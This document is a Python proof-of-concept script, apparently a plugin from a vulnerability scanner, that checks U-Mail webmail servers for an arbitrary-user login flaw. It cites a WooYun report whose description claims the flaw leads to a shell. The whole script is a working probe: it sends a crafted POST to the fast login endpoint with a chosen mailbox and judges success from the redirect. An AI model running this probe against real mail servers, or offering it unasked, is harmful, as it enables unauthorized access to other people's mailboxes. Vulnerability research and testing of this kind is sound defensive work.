#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: U-Mail邮件系统sessionid访问
referer: http://www.wooyun.org/bugs/wooyun-2010-093049
author: Lucifer
description: 该邮件系统存在任意用户登录、且存在注入，从而可以无限制完美getshell(getshell过程只需简单三个请求)。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['U-Mail邮件系统sessionid访问','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            }
        payload = "/webmail/fast/index.php?module=operate&action=login"
        post_data = {
                "mailbox":"test@domain.com",
                "link":"?"
            }
        vulnurl = url + payload
        try:
            req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
            if r'<meta http-equiv="refresh" content="0; URL=index.php">' in req.text:
                result[2]=  '存在'
                result[1] = vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
